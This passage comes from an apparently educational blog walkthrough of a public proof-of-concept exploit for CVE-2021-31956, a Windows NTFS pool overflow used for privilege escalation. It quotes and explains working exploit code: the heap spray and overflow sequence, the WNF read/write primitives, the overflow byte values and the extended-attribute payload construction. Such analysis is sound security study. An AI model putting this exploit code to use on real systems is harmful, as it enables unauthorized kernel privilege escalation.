    return status;
</code></pre>
<p>We notice that if the <code>_NtUpdateWnfStateData</code> returns <code>STATUS_SUCCESS</code>, <code>write_pool</code> simply returns the <code>status</code> value <code>STATUS_SUCCESS</code> and outputs a <code>puts</code> message to the screen. However, if <code>status</code> is not equal to <code>STATUS_SUCCESS</code>, <code>write_pool</code> outputs a <code>log_warn</code> message and returns the <code>status</code> value.</p>
<h4 id="sandbox-constraints"><a class="header" href="#sandbox-constraints">Sandbox Constraints</a></h4>
<p>One thing to keep in mind is that the <code>_NtUpdateWnfStateData</code> function is unavailable when operating in Low Integrity.</p>
<h3 id="the-read_pool-function"><a class="header" href="#the-read_pool-function">The read_pool Function</a></h3>
<p>Next, in order to read from the pool, we will examine how to use <code>NtQueryWnfStateData</code> to achieve this. According to <a href="https://pwnedcoffee.com/blog/wnf-chronicles-i-introduction/">Nacho Gomez</a>, we can define the purpose of <code>NtQueryWnfStateData</code> as follows:</p>
<blockquote>
<p>Using the NtQueryWnfStateData API, any process can access the latest StateData published for a given StateName at any time (as long as it has read privileges over the StateNames ACL), without being subscribed.</p>
</blockquote>
<p>This goes in-line with the functionality of <code>read_pool</code>. Now with the purpose of <code>read_pool</code> laid out, let's go over its function declaration:</p>
<pre><code class="language-cpp">NTSTATUS read_pool(_In_ PWNF_STATE_NAME statenames, _In_ ULONG idx, _Out_ char *buf, _Inout_ PULONG buf_sz)
</code></pre>
<p>As shown above, the <code>read_pool</code> function returns a <code>NTSTATUS</code> value and accepts 4 parameters as input. We will now go over the purpose of each parameter:</p>
<ul>
<li><code>statenames</code>: A read-only pointer to a <code>WNF_STATE_NAME</code> structure. However, based on the usage by the <code>main</code> function, <code>statenames</code> is a collection of <code>WNF_STATE_NAME</code> structures where the index <code>idx</code> points to a specific <code>WNF_STATE_NAME</code> structure.</li>
<li><code>idx</code>: A read-only unsigned long value.</li>
<li><code>buf</code>: A reference to a character buffer.</li>
<li><code>buf_sz</code>: A modifiable pointer to a unsigned long value.</li>
</ul>
<p>With each parameter defined, we will now look at the variable initializations:</p>
<pre><code class="language-cpp">NTSTATUS                status = STATUS_SUCCESS;
WNF_CHANGE_STAMP        stamp = 0;
UINT64                  name = 0;
</code></pre>
<p>We see each of the above variables are initialized to <code>0</code>, with both the <code>stamp</code> an <code>name</code> values being passed as references to the <code>_NtQueryWnfStateData</code> function call. Now with the initializations out of the way, let's look at how <code>read_pool</code> modifies the <code>name</code> variable:</p>
<pre><code class="language-cpp">name = (UINT64)(*(UINT64 *)(statenames[idx].Data));
</code></pre>
<p>Here, we see that at index <code>idx</code> within the <code>statenames</code> collection of <code>WNF_STATE_NAME</code> structures allocated in memory, we read the <code>Data</code> value. Next, let's examine the usage and background of the <code>_NtQueryWnfStateData</code> function call:</p>
<pre><code class="language-cpp">status = _NtQueryWnfStateData((PCWNF_STATE_NAME)&amp;name, NULL, NULL, &amp;stamp, buf, buf_sz);
if (!NT_SUCCESS(status)) {
    log_warn("read_pool::_NtQueryWnfStateData()1");
    goto out;
}
</code></pre>
<p>First, let's look at the function prototype for <code>_NtQueryWnfStateData</code>:</p>
<pre><code class="language-cpp">_NtQueryWnfStateData = (NQWSD)GetProcAddress(ntdll, "NtQueryWnfStateData");
</code></pre>
<p>Let's examine the function prototype the custom pointer data structure is based on:</p>
<pre><code class="language-cpp">typedef NTSTATUS(NTAPI *NQWSD)(
    _In_ PCWNF_STATE_NAME StateName,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const VOID *ExplicitScope,
    _Out_ PWNF_CHANGE_STAMP ChangeStamp,
    _Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,
    _Inout_ PULONG BufferSize
    );
</code></pre>
<p>With the exception of the <code>_In_opt_</code> variables which are set to <code>NULL</code>, referencing the above prototype, we look at the provided input parameters, we break each one down according to it's purpose:</p>
<ul>
<li><code>name</code>: A read-only address to the <code>WNF_STATE_NAME</code> structure at index <code>idx</code>.</li>
<li><code>stamp</code>: A memory address to our zero-initialized <code>WNF_CHANGE_STAMP</code> structure.</li>
<li><code>buf</code>: An optional pointer to an array of <code>buf_sz</code> elements.</li>
</ul>
<p>Finally, after calling <code>NtQueryWnfStateData</code> the <code>read_pool</code> function returns the <code>NTSTATUS</code> value from the <code>NtQueryWnfStateData</code> function call:</p>
<pre><code class="language-cpp">out:
    return status;
</code></pre>
<h4 id="sandbox-constraints-1"><a class="header" href="#sandbox-constraints-1">Sandbox Constraints</a></h4>
<p>One thing to keep in mind is that the <code>GetProcAddress</code> function is unavailable when operating in Low Integrity.</p>
<h3 id="the-find_chunk-function"><a class="header" href="#the-find_chunk-function">The find_chunk Function</a></h3>
<p>Before delving into the <code>find_chunk</code> function, let's first take a look at its implementation within the <code>main</code> function:</p>
<pre><code class="language-cpp">if (!NT_SUCCESS(resolve_symbols()))
        goto out;

if (!NT_SUCCESS(get_eproc(&amp;own_eproc)))
    goto out;

if (!NT_SUCCESS(spray_heap(statenames, SPRAY_COUNT, &amp;buf, sizeof(buf))))
    goto out;

if (!NT_SUCCESS(fragment_heap(statenames, SPRAY_COUNT)))
    goto out;

if (!NT_SUCCESS(overflow_chunk(OVERFLOW_SZ, OVERFLOW_DATA, OVERFLOW_SZ)))
    goto out;

while (!NT_SUCCESS(find_chunk(statenames, SPRAY_COUNT, &amp;buf, &amp;buf_sz, &amp;overflow_idx)))
    if (!NT_SUCCESS(overflow_chunk(OVERFLOW_SZ, OVERFLOW_DATA, OVERFLOW_SZ)))
        goto out;
</code></pre>
<p>Here we see that after the paged heap is sprayed, fragmented, and overflowed, we then proceed to use the <code>find_chunk</code> function. Let's look at the variables used in the function call to <code>find_chunk</code>:</p>
<pre><code class="language-cpp">//CVE-2021-31956.h
#define SPRAY_COUNT 0x20000
//...
typedef struct _WNF_STATE_NAME
{
    ULONG Data[2];
} WNF_STATE_NAME, *PWNF_STATE_NAME, *PCWNF_STATE_NAME;
//...

//CVE-2021-31956.c
PWNF_STATE_NAME         statenames = zalloc(SPRAY_COUNT * sizeof(WNF_STATE_NAME));
char                    buf[0xa0] = { 0 };
ULONG                   buf_sz = sizeof(buf);
ULONG                   overflow_idx = 0;
//...
</code></pre>
<p>Let's now summarize the purpose of <code>find_chunk</code> with relation to how the key variable and structural definitions are used:</p>
<blockquote>
<p>The <code>statenames</code> pointer is iterated over at index 0 in order to obtain the <code>statenames</code> index at which the overflow occurs. Once the overflow is found, the <code>overflow_idx</code> is returned, containing the <code>WNF_STATE_NAME</code> index that is found to be overflowed.</p>
</blockquote>
<p>With the summary out of the way, let's examine the <code>find_chunk</code> function line-by-line starting with the function declaration:</p>
<pre><code class="language-cpp">NTSTATUS find_chunk(_In_ PWNF_STATE_NAME statenames, _In_ UINT64 count, _Out_ char *buf, _Inout_ PULONG buf_sz, _Out_ PULONG idx)
</code></pre>
<p>Let's formally break down each of the input parameters for the <code>find_chunk</code> function:</p>
<ul>
<li><code>statenames</code>: A read-only pointer to a series of <code>WNF_STATE_NAME</code> structures. Of which, one of the structures may be overflowed as thus exploitable.</li>
<li><code>count</code>: A read-only 64-bit unsigned integer specifying the number of <code>WNF_STATE_NAME</code> structures sprayed.</li>
<li><code>buf</code>: A reference to the sprayed buffer.</li>
<li><code>buf_sz</code>: A modifiable pointer to a unsigned long value indicating the size of the sprayed buffer <code>buf</code>.</li>
<li><code>idx</code>: A pointer to the unsigned long value location for the index of the overflowed <code>WNF_STATE_NAME</code> structure.</li>
</ul>
<p>Now that we have defined the input parameters of the <code>find_chunk</code> function, let's now examine the variable declarations for <code>find_chunk</code>:</p>
<pre><code class="language-cpp">NTSTATUS                status = STATUS_SUCCESS;
WNF_CHANGE_STAMP        stamp = 0;
UINT64                  name = 0;
int                     overflow = -1;
</code></pre>
<p>As with the input parameters, let's formally define the use of each of the variables defined:</p>
<ul>
<li><code>status</code>: A <code>NTSTATUS</code> value used to determine whether or not a <code>WNF_STATE_DATA</code> structure was found to be overflowed.</li>
</ul>
<p>Before in order to fully understand the <code>stamp</code> variable that defined next, let's examine the <code>WNF_CHANGE_STAMP</code> data structure:</p>
<pre><code class="language-cpp">typedef ULONG WNF_CHANGE_STAMP, *PWNF_CHANGE_STAMP;
</code></pre>
<p>We see that the <code>stamp</code> is really just a unsigned long value. However, in the context of the <code>find_chunk</code> function, stamp is used as part of the <code>_NtQueryWnfStateData</code> function call. Therefore, let's examine the NULL-pointer declaration for <code>_NtQueryWnfStateData</code>:</p>
<pre><code class="language-cpp">_NtQueryWnfStateData = (NQWSD)GetProcAddress(ntdll, "NtQueryWnfStateData");
</code></pre>
<p>With this in mind, let's now look at the type definition for <code>NQWSD</code>:</p>
<pre><code class="language-cpp">typedef NTSTATUS(NTAPI *NQWSD)(
    _In_ PCWNF_STATE_NAME StateName,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const VOID *ExplicitScope,
    _Out_ PWNF_CHANGE_STAMP ChangeStamp,
    _Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,
    _Inout_ PULONG BufferSize
    );
</code></pre>
<p>We see that the <code>stamp</code> variable used is actually a reference for the <code>_NtQueryWnfStateData</code> function call to output the <code>ChangeStamp</code> value to. In layman's terms, the <code>stamp</code> variable is used by the <code>find_chunk</code> function to hold the <code>ChangeStamp</code> value of every <code>WNF_STATE_NAME</code> iterated. Each <code>ChangeStamp</code> value stored in <code>stamp</code> will then be checked for the magic value of <code>0x5000</code>. If found, <code>find_chunk</code> will return a <code>NTSTATUS</code> value of <code>STATUS_SUCCESS</code>. If not, <code>find_chunk</code> will return a value of <code>STATUS_UNSUCCESSFUL</code>.</p>
<p>Let's now proceed to the final two variables defined in <code>find_chunk</code>:</p>
<ul>
<li><code>name</code>: A unsigned integer, initialized to 0, that contains a pointer to the <code>Data</code> member of each <code>WNF_STATE_NAME</code>. When used by <code>_NtQueryWnfStateData</code>, it will serve as a reference to the specific <code>WNF_STATE_NAME</code> used by <code>find_chunk</code> to test if the <code>ChangeStamp</code> value has been corrupted or not.</li>
<li><code>overflow</code>: A integer, initialized to -1, that will be set to the index of the corrupted <code>WNF_STATE_NAME</code> if found.</li>
</ul>
<p>With both the function declaration and the variable definitions examined, let's now look into the <code>for</code> loop used to iterate over each <code>WNF_STATE_NAME</code> structure created during the heap spray:</p>
<pre><code class="language-cpp">for (int i = 0; i &lt; count; i++)
{
    if (!statenames[i].Data[0])
        continue;
        //...
}
</code></pre>
<p>The <code>for</code> loop starts by first checking if the <code>Data</code> member is valid. If it is not, continue to the next <code>WNF_STATE_NAME</code> chunk.</p>
<pre><code class="language-cpp">for (int i = 0; i &lt; count; i++)
{
    //...
    name = (UINT64)(*(UINT64 *)(statenames[i].Data));
    //...
}
</code></pre>
<p>Here, the <code>name</code> variable is pointed to the <code>Data</code> member of the ith <code>WNF_STATE_NAME</code> chunk.</p>
<pre><code class="language-cpp">for (int i = 0; i &lt; count; i++)
{
    //...
    status = _NtQueryWnfStateData((PCWNF_STATE_NAME)&amp;name, NULL, NULL, &amp;stamp, buf, buf_sz);
    //...
}
</code></pre>
<p>Next, the <code>NtQueryWnfStateData</code> function is called in order to obtain the <code>ChangeStamp</code> value of the ith <code>WNF_STATE_NAME</code> chunk.</p>
<pre><code class="language-cpp">for (int i = 0; i &lt; count; i++)
{
    //...
    if ((ULONG)stamp == 0x5000) {
        overflow = i; // found our overflow chunk index
        printf("[+] Successfully overflowed into a WNF_STATE_DATA chunk at index 0x%x\n", overflow);
        break;
    }
    //...
}
</code></pre>
<p>The <code>ChangeStamp</code> value is then checked against the magic number <code>0x5000</code> to determine if the <code>WNF_STATE_NAME</code> is corrupted. If the <code>ChangeStamp</code> is equal to <code>0x5000</code>, the <code>overflow</code> variable is set to the index <code>i</code> and the <code>for</code> loop is broken.</p>
<pre><code class="language-cpp">for (int i = 0; i &lt; count; i++)
{
    //...
    if (!NT_SUCCESS(status)) {
        log_warn("find_chunk::_NtQueryWnfStateData()1");
        goto out;
    }
}
</code></pre>
<p>However, if the <code>NTSTATUS</code> variable <code>status</code> is not equal to <code>STATUS_SUCCESS</code>, the program breaks and goes to the <code>out</code> designated portion of the program. In other words, if the <code>NtQueryWnfStateData</code> function call fails for whatever reason, the program breaks and goes to <code>out</code>.</p>
<pre><code class="language-cpp">if (overflow == -1) {
    // means we corrupted a wnf name instance instead of name header, should overflow again.
    // we will fix these corrupted wnf name instances in the end.
    log_warn("Did not overflow a WNF_STATE_DATA chunk, overflow again!");
    status = STATUS_UNSUCCESSFUL;
    goto out;
}
else
    status = STATUS_SUCCESS;
</code></pre>
<p>After the <code>for</code> loop completes, if the <code>overflow</code> variable is not set to the ith index, the corrupted <code>WNF_STATE_DATA</code> chunk was not found and the <code>NTSTATUS</code> variable <code>status</code> is set to <code>STATUS_UNSUCCESSFUL</code> and the program goes to <code>out</code>. However, if the <code>overflow</code> variable was set to the ith index of the <code>WNF_STATE_DATA</code> chunks, the program sets the <code>status</code> variable to <code>STATUS_SUCCESS</code>.</p>
<pre><code class="language-cpp">*idx = overflow;

out:
    return status;
</code></pre>
<p>The pointer <code>idx</code> is set to the corrupted <code>WNF_STATE_DATA</code> index and the <code>status</code> is returned to the callee.</p>
<h3 id="the-overflow_chunk-function"><a class="header" href="#the-overflow_chunk-function">The overflow_chunk Function</a></h3>
<p>Before discussing the specifics of the <code>overflow_chunk</code> function, let's first review how exactly the vulnerability can be reached from user-mode. According to the previously-covered advisory, this can be achieved through a <code>ntoskrnl.exe</code> <em>system call</em> (syscall). Therefore, we want to find any syscalls related to extended attributes (<code>Ea</code>). After looking through the <a href="https://hfiref0x.github.io/NT10_syscalls.html">Windows x64 syscall table</a> provided by <a href="https://hfiref0x.github.io/">hfiref0x</a>, we find the following two entries:</p>
<p><img src="img/2024-03-06-22-51-09.png" alt="" /></p>
<p><img src="img/2024-03-06-22-51-29.png" alt="" /></p>
<p>Because the advisory mentioned the vulnerable function is called <code>NtfsQueryEaUserEaList</code>, we can make an educated guess and assume that the <code>NtQueryEaFile</code> syscall will eventually reach <code>NtfsQueryEaUserEaList</code>. The same logic is applied to the <code>NtSetEaFile</code> syscall.</p>
<p>Thus, we will see the <code>overflow_chunk</code> using the <code>NtSetEaFile</code> syscall to create the conditions needed so that the syscall <code>NtQueryEaFile</code> can trigger the vulnerability. Now that we know the syscalls needed to invoke the vulnerability, let's examine it's usage within the <code>overflow_chunk</code> function starting with the function definition:</p>
<pre><code class="language-cpp">NTSTATUS overflow_chunk(_In_ USHORT overflow_chunk_sz, _In_ char *overflow_data, _In_ USHORT overflow_data_sz)
</code></pre>
<p>Before discussing the function definition for <code>overflow_chunk</code>, let's examine the values used when <code>overflow_chunk</code> is called in <code>main</code>:</p>
<pre><code class="language-cpp">//CVE-2021-31956.h
#define OVERFLOW_DATA "\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00\x00\x50\x00\x00"
#define OVERFLOW_SZ 0x18
</code></pre>
<p>The <code>overflow_chunk</code> function takes in three parameters:</p>
<ul>
<li><code>overflow_chunk_sz</code>: A read-only unsigned short used as the <code>EaValueLength</code> value.</li>
<li><code>overflow_data</code>: A read-only pointer to a character buffer containing the bytes that will overflow into the neighboring data structure. As observed with the <code>find_chunk</code> function, this data is set to a series of <code>0x5000</code> values used as a magic number.</li>
<li><code>overflow_data_sz</code>: A read-only unsigned short that specifies the size of the <code>memcopy</code> used to overflow the buffer.</li>
</ul>
<p>Now that we have defined how the input parameters are used by <code>overflow_chunk</code>, we will now discuss the variable definitions found in the function:</p>
<pre><code class="language-cpp">NTSTATUS                    status = STATUS_SUCCESS;
HANDLE                      file = INVALID_HANDLE_VALUE;
IO_STATUS_BLOCK             x = { 0 };
FILE_FULL_EA_INFORMATION    *fetched_data = zalloc(0x300);
FILE_GET_EA_INFORMATION     *vuln_selector = zalloc(0x300);
FILE_GET_EA_INFORMATION     *vuln_selector2;
FILE_FULL_EA_INFORMATION    *payload = zalloc(0x300);
FILE_FULL_EA_INFORMATION    *overflow;
</code></pre>
<p>Let's now examine each variable in-depth:</p>
<ul>
<li><code>status</code>: A variable returned after function execution of type <code>NTSTATUS</code> initialized to <code>STATUS_SUCCESS</code>.</li>
<li><code>file</code>: A handle to the file whose Extended Attributes will be exploited.</li>
</ul>
<p>Before examining <code>x</code>, let's first review what an <code>IO_STATUS_BLOCK</code> datatype is. According to Microsoft,</p>
<blockquote>
<p>A driver sets an IRP's I/O status block to indicate the final status of an I/O request, before calling IoCompleteRequest for the IRP.</p>
</blockquote>
<p>Thus, with this in mind, <code>x</code> is first initialized to <code>0</code> from which its reference will be passed to both <code>NtSetEaFile</code> and <code>NtQueryEaFile</code>.</p>
<p>Let's now examine the <code>fetched_data</code> variable. According to NTInternals,</p>
<blockquote>
<p><code>NtQueryEaFile</code> is used to read <code>EA</code> from <code>NTFS</code> file</p>
</blockquote>
<p>Let's examine the type definition for <code>NtQueryEaFile</code>'s function prototype Y3A used in <code>CVE-2021-31956.h</code>:</p>
<pre><code class="language-cpp">typedef NTSTATUS(*NQEF)(
    HANDLE           FileHandle,
    PIO_STATUS_BLOCK IoStatusBlock,
    PVOID            Buffer,
    ULONG            Length,
    BOOLEAN          ReturnSingleEntry,
    PVOID            EaList,
    ULONG            EaListLength,
    PULONG           EaIndex,
    BOOLEAN          RestartScan
    );
</code></pre>
<p>With this definition in mind, let's look to see how <code>fetched_data</code> is used in <code>overflow_chunk</code>:</p>
<pre><code class="language-cpp">NtQueryEaFile(file, &amp;x, fetched_data, 0xaa, FALSE, vuln_selector, 0x300, NULL, TRUE);
</code></pre>
<p>We see <code>fetched_data</code> is a pointer to <code>Buffer</code>, were according to NTInternals, <code>Buffer</code> is defined as,</p>
<blockquote>
<p>Caller's allocated buffer for output data.</p>
</blockquote>
<p>However, in the context of our exploit, we will not use <code>fetched_data</code> after it is called. The focus of the exploit is to use <code>NtQueryEaFile</code> to overflow into the next data structure in memory.</p>
<p>Let's now examine the variable <code>vuln_selector</code>. As with the <code>fetched_data</code> variable, this value also appears to be a pointer used in the function call to <code>NtQueryEaFile</code>. In the case of <code>vuln_selector</code>, it is used as the <code>EaList</code> pointer. According to NTInternals, <code>EaList</code> is described as:</p>
<blockquote>
<p>Optional list of FILE_GET_EA_INFORMATION structures containing names of EA</p>
</blockquote>
<p>Reviewing the usage of <code>vuln_selector</code>, we observe that it is used extensively to access the various properties of the first <em>Extended Attribute</em> defined by <code>EANAME1</code> and provided in the <code>FILE_GET_EA_INFORMATION</code> structure.</p>
<p>Reviewing the usage of <code>vuln_selector</code>, we observe that it is used extensively to access the various properties of the first <em>Extended Attribute</em> defined by <code>EANAME1</code> and provided in the <code>FILE_GET_EA_INFORMATION</code> structure.</p>
<p>Similar to <code>vuln_selector</code>, <code>vuln_selector2</code> provides the same functionality except with the target <em>Extended Attribute</em> being defined by <code>EANAME2</code>. However, it is interesting to note that the pointer for <code>vuln_selector2</code> is not allocated any memory initially. However, after being declared, the pointer <code>vuln_selector2</code> is then assigned to the next <em>Extended Attribute</em> entry at the <code>NextEntryOffset</code> offset of <code>vuln_selector</code>.</p>
<p>Now, let's examine the purpose of the <code>payload</code> pointer. We see it is of the <code>FILE_FULL_EA_INFORMATION</code> structure, which is the same structure as the <code>fetched_data</code> variable. However, in this case, it is used to create the payload which will be injected via the <code>NtSetEaFile</code> function call.</p>
<p>Finally, let's examine the purpose of the <code>overflow</code> variable. As with both <code>fetched_data</code> and <code>payload</code>, <code>overflow</code> is initialized as a pointer to a <code>FILE_FULL_EA_INFORMATION</code> structure. However, in the case of <code>overflow</code>, it is not allocated memory and is simply declared. Within the context of the <code>overflow_chunk</code> function, <code>overflow</code> is used to get the next <em>Extended Attribute</em> entry at the <code>NextEntryOffset</code> offset of <code>payload</code>.</p>
<p>Now that we have defined the variables used within <code>overflow_chunk</code>, let's look at the function's purpose starting with the API call to <code>CreateFileA</code>:</p>
<pre><code class="language-cpp">file = CreateFileA("c:\\users\\username\\desktop\\placeholder.txt",
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    NULL);
</code></pre>
<p>Since the <em>ExtendedAttributes</em> are associated to a file, we first need to create a user-controlled file through the <code>CreateFileA</code> API.</p>
<pre><code class="language-cpp">if (file == INVALID_HANDLE_VALUE) {
    log_warn("overflow_chunk::_CreateFileA()1");
    goto out;
}
</code></pre>
<p>If there is an issue with the file's creation, the above <code>if</code> statement will catch any error and terminate the function early by going to the <code>out</code> portion of <code>overflow_chunk</code>.</p>
<pre><code class="language-cpp">if (!fetched_data || !vuln_selector || !payload) {
    log_warn("overflow_chunk::zalloc()1");
    goto out;
}
</code></pre>
<p>Next, we see that if any of the pointer allocations are invalid, the same early termination then occurs. Let's now examine the use of <code>vuln_selector</code> after it has been initialized and allocated:</p>
<pre><code class="language-cpp">vuln_selector-&gt;EaNameLength = (UCHAR)strlen(EANAME1);
memcpy(vuln_selector-&gt;EaName, EANAME1, vuln_selector-&gt;EaNameLength);
vuln_selector-&gt;NextEntryOffset = (ULONG)0xc;
</code></pre>
<p>Walking through the above code line by line we observe the first line sets the <code>EaNameLength</code> of the <em>ExtendedAttribute</em> pointed to by <code>vuln_selector</code> to the length of the <code>EANAME1</code> value. According to <code>CVE-2021-31956.h</code> of Y3A's proof-of-concept, this value is set to the string <code>abc</code>. Next, a <code>memcopy</code> is performed copying <code>EANAME1</code> to <code>EaName</code> with length <code>EaNameLength</code>. Finally, the <code>NextEntryOffset</code> is set to <code>0xC</code>, which then allows <code>vuln_selector2</code> to obtain the next <em>ExtendedAttribute</em> structure.</p>
<pre><code class="language-cpp">vuln_selector2 = (PFILE_GET_EA_INFORMATION)((UINT64)vuln_selector + (UINT64)(vuln_selector-&gt;NextEntryOffset));
vuln_selector2-&gt;EaNameLength = (UCHAR)strlen(EANAME2);
memcpy(vuln_selector2-&gt;EaName, EANAME2, vuln_selector2-&gt;EaNameLength);
vuln_selector2-&gt;NextEntryOffset = (ULONG)0x0;
</code></pre>
<p>The implementation of <code>vuln_selector2</code> is similar to <code>vuln_selector</code> with one key difference: The first line initializes <code>vuln_selector2</code> to the next <em>ExtendedAttribute</em> data structure after <code>vuln_selector</code>. The second line sets the <code>EaNameLength</code> of the <em>ExtendedAttribute</em> pointed to by <code>vuln_selector2</code> to the length of the <code>EANAME2</code> value. According to <code>CVE-2021-31956.h</code> of Y3A's proof-of-concept, this value is set to the string <code>bcd</code>. Next, a <code>memcopy</code> is performed copying <code>EANAME2</code> to <code>EaName</code> with length <code>EaNameLength</code>. Finally, the <code>NextEntryOffset</code> is set to <code>0x0</code>, which indicates no following <em>ExtendedAttributes</em> structures are after <code>vuln_selector2</code>.</p>
<p>Next, let's take a look at the implementation of the <code>payload</code> pointer within <code>overflow_chunk</code>:</p>
<pre><code class="language-cpp">payload-&gt;Flags = (UCHAR)0x0;
</code></pre>
<p>First, we observe that the <em>ExtendedAttribute</em> flags are set to <code>0x0</code>. According to <a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/ns-wdm-_file_full_ea_information">Microsoft</a>, flags are defined as follows:</p>
<blockquote>
<p>Can be zero or can be set with <code>FILE_NEED_EA</code>, indicating that the file to which the EA belongs to cannot be interpreted without understanding the associated extended attributes.</p>
</blockquote>
<p>In our case, since the <em>ExtendedAttribute</em> flag member is set to <code>0x0</code>, we can assume that the file can be interpreted without needing to understand the associated extended attributes. Next, let's look at <code>EaNameLength</code>:</p>
<pre><code class="language-cpp">payload-&gt;EaNameLength = (UCHAR)strlen(EANAME1);
</code></pre>
<p>According to Microsoft, <code>EaNameLength</code> is as follows:</p>
<blockquote>
<p>The length in bytes of the <code>EaName</code> array. This value does not include a null-terminator to <code>EaName</code>.</p>
</blockquote>
<p>We see the name itself, <code>EaNameLength</code>, is rather self explanatory and in it's implementation we see that <code>EaNameLength</code> is set to <code>EANAME</code>. Referencing back to <code>CVE-2021-31956.h</code>, we know that <code>EANAME1</code> is set to the string <code>abc</code>. Thus, <code>EaNameLength</code> would be equal to the length of <code>EANAME1</code>.</p>
<pre><code class="language-cpp">payload-&gt;EaValueLength = (USHORT)0x9d;
</code></pre>
<p>Next, we look at <code>EaValueLength</code>. According to Microsoft, <code>EaValueLength</code> is:</p>
<blockquote>
<p>The length in bytes of each EA value in the array.</p>
</blockquote>
<p>Unlike the <code>EANAME1</code>, <code>EaValueLength</code> examines the length of the <em>ExtendedAttribute</em>e contents rather than just the name of the <em>ExtendedAttribute</em>. In the case of <code>payload</code>, the <em>ExtendedAttribute</em> value for <code>EANAME1</code> is `0x9d.</p>
<pre><code class="language-cpp">memcpy(payload-&gt;EaName, EANAME1, payload-&gt;EaNameLength);
</code></pre>
<p>After the <code>Flags</code>, <code>EaNameLength</code>, and <code>EaValueLength</code> members are set within the <code>payload</code> <em>ExtendedAttribute</em>, we then proceed to perform a <code>memcopy</code>, to <code>EaName</code> with the contents of <code>EANAME1</code> and the length of <code>EaNameLength</code>.</p>
<pre><code class="language-cpp">memset(payload-&gt;EaName + payload-&gt;EaNameLength + 0x1, 'C', payload-&gt;EaValueLength);
</code></pre>
<p>Next, we see that <code>memset</code> is then used to set the memory region pointed to at <code>EaName+EaNameLength+0x1</code> to all <code>C</code> with a length of <code>EaValueLength</code>.</p>
<pre><code class="language-cpp">payload-&gt;NextEntryOffset = (ULONG)((payload-&gt;EaNameLength + payload-&gt;EaValueLength + 0x3 + 0x9) &amp; (~0x3));
</code></pre>
<p>Finally, we get to the <code>NextEntryOffset</code> member of the <code>payload</code> instantiation of the <code>FILE_FULL_EA_INFORMATION</code> structure. Let's break down exactly what the offset is calculated to be:</p>
<ul>
<li>First, the <code>EaNameLength</code> member is added to the <code>EaValueLength</code>.</li>
<li>Then, the value <code>0x3</code> and <code>0x9</code> are added.</li>
<li>Finally, an AND operation is carried out with the right-hand value being the bitwise NOT of <code>0x3</code>.</li>
</ul>
<p>We review Y3A's blogpost and notice that Y3A's way of calculating the <code>NextEntryOffset</code> is simply translated from the decompiled <code>NtfsQueryEaUserEaList</code> as shown below:</p>
<pre><code class="language-cpp">HANDLE                      file = INVALID_HANDLE_VALUE;
IO_STATUS_BLOCK             x = { 0 };
FILE_FULL_EA_INFORMATION    *fetched_data = zalloc(0x300);
FILE_GET_EA_INFORMATION     *selector = zalloc(0x300);
FILE_GET_EA_INFORMATION     *selector2;
FILE_FULL_EA_INFORMATION    *eadata1 = zalloc(0x300);
FILE_FULL_EA_INFORMATION    *eadata2;

file = CreateFileA("c:\\users\\chenl\\desktop\\ABC.txt",
    GENERIC_READ | GENERIC_WRITE,
    FILE_SHARE_READ | FILE_SHARE_WRITE,
    NULL,
    CREATE_ALWAYS,
    FILE_ATTRIBUTE_NORMAL,
    NULL);

selector-&gt;EaNameLength = (UCHAR)strlen(EANAME1);
memcpy(selector-&gt;EaName, EANAME1, selector-&gt;EaNameLength);
selector-&gt;NextEntryOffset = (ULONG)0xc;

selector2 = (PFILE_GET_EA_INFORMATION)((UINT64)selector + (UINT64)(selector-&gt;NextEntryOffset));
selector2-&gt;EaNameLength = (UCHAR)strlen(EANAME2);
memcpy(selector2-&gt;EaName, EANAME2, selector2-&gt;EaNameLength);
selector2-&gt;NextEntryOffset = (ULONG)0x0;

eadata1-&gt;Flags = (UCHAR)0x0;
eadata1-&gt;EaNameLength = (UCHAR)strlen(EANAME1);
eadata1-&gt;EaValueLength = (USHORT)0x9d;
memcpy(eadata1-&gt;EaName, EANAME1, eadata1-&gt;EaNameLength);
memset(eadata1-&gt;EaName + eadata1-&gt;EaNameLength + 0x1, 'C', eadata1-&gt;EaValueLength);
eadata1-&gt;NextEntryOffset = (ULONG)((eadata1-&gt;EaNameLength + eadata1-&gt;EaValueLength + 0x3 + 0x9) &amp; (~0x3));

eadata2 = (PFILE_FULL_EA_INFORMATION)((UINT64)eadata1 + (UINT64)(eadata1-&gt;NextEntryOffset));
eadata2-&gt;NextEntryOffset = (ULONG)0x0;
eadata2-&gt;Flags = (UCHAR)0x0;
eadata2-&gt;EaNameLength = (UCHAR)strlen(EANAME2);
eadata2-&gt;EaValueLength = (USHORT)eadata2_chunk_sz;
memcpy(eadata2-&gt;EaName, EANAME2, eadata2-&gt;EaNameLength);
memcpy(eadata2-&gt;EaName + eadata2-&gt;EaNameLength + 0x1, eadata2_data, eadata2_data_sz);

_NtSetEaFile(file, &amp;x, eadata1, 0x300);

NtQueryEaFile(file, &amp;x, fetched_data, 0xaa, FALSE, selector, 0x300, NULL, TRUE);
</code></pre>
<p>Thus, we also will look at the following excerpt from Y3A's blogpost:</p>
<blockquote>
<p>The way of calculating NextEntryOffset is taken from the decompiled <code>NtfsQueryEaUserEaList</code> above. 0x9 bytes for the size of all the field members excluding actual data, adding 0x3 to ensure the buffer will not shrink when aligning it to 0x4 bytes with a bitwise AND. If we want an integer underflow, <code>out_buf_length</code> must be smaller than padding while dealing with the second <code>Ea</code> list. The smallest <code>out_buf_length</code> we can achieve is 0x1, which is when the size we specified is 1 byte larger than our first <code>Ea</code> list. The largest padding size we can achieve is 0x3. Using the values in the code above, a <code>namelength</code> of 0x3 and a <code>valuelength</code> of 0x9d makes a total size of 0xa0, which is 4-bytes aligned. Adding 0x9 to it gives us 0xa9, which is one byte off. This means upon adding 0x3 as the final calculation, our padding will be exactly 0x3 bytes.</p>
</blockquote>
<p>Now that we understand how the <code>payload</code> instantiation of <code>FILE_FULL_EA_INFORMATION</code> works, let's now examine how exactly the overflow occurs using the <code>overflow</code> instantiation of the <code>FILE_FULL_EA_INFORMATION</code> data structure:</p>
